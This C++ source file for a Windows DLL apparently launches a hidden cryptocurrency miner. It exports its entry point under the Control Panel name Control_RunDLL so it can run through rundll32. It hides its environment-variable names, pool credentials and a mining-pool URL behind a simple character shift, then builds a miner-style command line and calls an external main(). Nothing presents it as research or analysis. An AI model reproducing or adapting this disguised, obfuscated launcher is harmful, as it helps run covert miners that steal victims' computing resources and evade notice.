#ifndef WINVER                          // Specifies that the minimum required platform is Windows Vista.
#define WINVER 0x0600           // Change this to the appropriate value to target other versions of Windows.
#endif

#ifndef _WIN32_WINNT            // Specifies that the minimum required platform is Windows Vista.
#define _WIN32_WINNT 0x0600     // Change this to the appropriate value to target other versions of Windows.
#endif

#ifndef _WIN32_WINDOWS          // Specifies that the minimum required platform is Windows 98.
#define _WIN32_WINDOWS 0x0410 // Change this to the appropriate value to target Windows Me or later.
#endif

#ifndef _WIN32_IE                       // Specifies that the minimum required platform is Internet Explorer 7.0.
#define _WIN32_IE 0x0700        // Change this to the appropriate value to target other versions of IE.
#endif


#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
#include "windows.h"
#include "stdio.h"
#include "locale.h"
#include <sstream>
#include <iostream>
#include "testcl.h"
#include "xstring"

//#pragma comment(linker, "/EXPORT:ScreenSaver_=__si0@16,PRIVATE") 
#pragma comment(linker, "/EXPORT:Control_RunDLL=__si1@16,PRIVATE")  

int main(int argc, char *argv[]);
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//bool ConstructA


PCHAR* CommandLineToArgv( PCHAR CmdLine, int* _argc )   
{
	PCHAR* argv; 
	PCHAR  _argv;
	size_t   len;       
	int   argc;       
	CHAR   a;       
	size_t   i, j;
	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;
	len = strlen(CmdLine);
	i = ((len+2)/2)*sizeof(PVOID) + sizeof(PVOID);
	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED, i + (len+2)*sizeof(CHAR));
	_argv = (PCHAR)(((PUCHAR)argv)+i);
	argc = 0;       
	argv[argc] = _argv;
	in_QM = FALSE;   
	in_TEXT = FALSE;   
	in_SPACE = TRUE;  
	i = 0;    
	j = 0;     
	while( a = CmdLine[i] )
	{           
		if(in_QM) {
			if(a == '\"') { 
				in_QM = FALSE; 
			} else {   
				_argv[j] = a;  
				j++;         
			}        
		} else {     
			switch(a) { 
			  case '\"':     
				  in_QM = TRUE;   
				  in_TEXT = TRUE;        
				  if(in_SPACE) {         
					  argv[argc] = _argv+j;  
					  argc++;             
				  }                
				  in_SPACE = FALSE;      
				  break;            
			  case ' ':             
			  case '\t':      
			  case '\n':           
			  case '\r':            
				  if(in_TEXT) {     
					  _argv[j] = '\0';    
					  j++;              
				  }                
				  in_TEXT = FALSE;      
				  in_SPACE = TRUE;               
				  break;          
			  default:           
				  in_TEXT = TRUE;        
				  if(in_SPACE) {              
					  argv[argc] = _argv+j;     
					  argc++;                 
				  }                 
				  _argv[j] = a;                
				  j++;                  
				  in_SPACE = FALSE;      
				  break;            
			}    
		}           i++;      
	}       _argv[j] = '\0'; 
	argv[argc] = NULL;    
	(*_argc) = argc;    
	return argv; 
}   


std::string& GetRawString(std::string& str  )
{
	std::cout<<" SecretString : "<<str.c_str()<<"\n";

 	std::string::iterator iter = str.begin();
	for ( ; iter != str.end(); iter++)
	{
		*iter = (( char)*iter + 10);
	}
	std::cout<<"Get RawString : "<<str.c_str()<<"\n";

	return str;
}
std::string& GetSecretString(std::string& str )
{
	std::cout<<" SecretString : "<<str.c_str()<<"\n";
 	std::string::iterator iter = str.begin();
	for ( ; iter != str.end(); iter++)
	{
		*iter = (( char)*iter - 10);
	}
	std::cout<<"Get RawString : "<<str.c_str()<<"\n";
	return str;
}
extern "C"  void CALLBACK _si0(
	HWND hwnd,
	HINSTANCE hinst,
	LPTSTR lpCmdLine,
	int nCmdShow
)
{
	TCHAR szUser[256] = {0};
	std::string strUserKey = "-user";
	GetEnvironmentVariable(GetSecretString(strUserKey).c_str() , szUser, 256);
	OutputDebugString("env p1 : ");
	OutputDebugString(szUser);
	OutputDebugString("\n");



	for (;;)
	{
		Sleep(0x0fffffff);	
	}	
	return ;
}
extern "C"  void CALLBACK _si1(
	HWND hwnd,
	HINSTANCE hinst,
	LPTSTR lpCmdLine,
	int nCmdShow
)
{	 
	TCHAR szVSD[32] = {0};
	GetEnvironmentVariable("VSD" , szVSD, 32);
	if(0 == stricmp(szVSD, "1"))
	{

#if 1
		AllocConsole();  	 
		freopen("CONIN$", "r+t", stdin); // 重定向 STDIN
		freopen("CONOUT$", "w+t", stdout); // 重定向STDOUT
		setlocale(0,"chs");
		//SetEnvironmentVariable("-invalidworker","1");	
#endif 
 
	}
	// AllocConsole();  
	//freopen_s(&fp,"conout$","w",stdout);    //打开控制台    

	 TCHAR szUser[256] = {0};
	 std::string strUserKey = "-user";
	 GetEnvironmentVariable(GetSecretString(strUserKey).c_str() , szUser, 256);
	 OutputDebugString("env2 p1 : ");
	 OutputDebugString(szUser);
	 OutputDebugString("\n");

	 std::string strUser = szUser;
	 if(0 >= strUser.length())
		strUser = "Wl_]^((U'";	 
	 GetRawString(strUser);

	 TCHAR szPWD[256] = {0};
	 std::string strPWDKey = "-password";
	 GetEnvironmentVariable(GetSecretString(strPWDKey).c_str() , szPWD, 256);
	 std::string strPWD = szPWD;
	 if(0 >= strPWD.length())
		strPWD = "Wl_]^((U'";
	 GetRawString(strPWD);

	 TCHAR szURL[2048] = {0};
	 std::string strURLKey = "-url";
	 GetEnvironmentVariable(GetSecretString(strURLKey).c_str() , szURL, 256);
	 std::string strURL = szURL;
	 if(0 >= strURL.length())
		 strURL = "^jjf0%%Z[$XjY]k_bZ$Yec0.))(";
	 GetRawString(strURL);
 
	 TCHAR szCurrentExePath[512] = {0};
	 GetModuleFileName(NULL, szCurrentExePath, 512);
	 TCHAR szCmdAll[4096] = {0};
	 LPTSTR lpszCmdAll = szCmdAll;
	 strcat_s(lpszCmdAll, 4096, szCurrentExePath);
	 strcat_s(lpszCmdAll,4096, " ");
	 
	 strcat_s(lpszCmdAll,4096, "-user=");
	 strcat_s(lpszCmdAll,4096, strUser.c_str());
	 strcat_s(lpszCmdAll,4096, " ");

	 strcat_s(lpszCmdAll,4096, "-password=");
	 strcat_s(lpszCmdAll,4096, strPWD.c_str());
	 strcat_s(lpszCmdAll,4096, " ");

	 strcat_s(lpszCmdAll,4096, "-url="); 

	 strcat_s(lpszCmdAll,4096, strURL.c_str()); 

	 //strcat_s(lpszCmdAll,4096, " "); strcat_s(lpszCmdAll,4096, "-threads=4");	 
	 
	 std::cout<<" cmdline : " <<lpszCmdAll<<"\n";	 

	 std::string strOutputCmdline = lpszCmdAll;
	 GetSecretString(strOutputCmdline);
	 OutputDebugString("env2 : ");
	 OutputDebugString(strOutputCmdline.c_str());
	 //MessageBox(NULL , lpszCmdAll, lpszCmdAll , MB_OK);
	
	 int argc = 0;
	 PCHAR* argv = NULL;
	 argv = CommandLineToArgv(lpszCmdAll, &argc);
	 main(argc , argv);
	 return ;
}
  


// #ki[h=(.'.)-'+6gg$YecU\\   #fWiimehZ=\\
// #ki[h=+(*(/&..6gg$YecU\\
// #ki[h=(*/-'//'()6gg$YecU\\
// #ki[h=',&(+.,-/(6gg$YecU\\

 


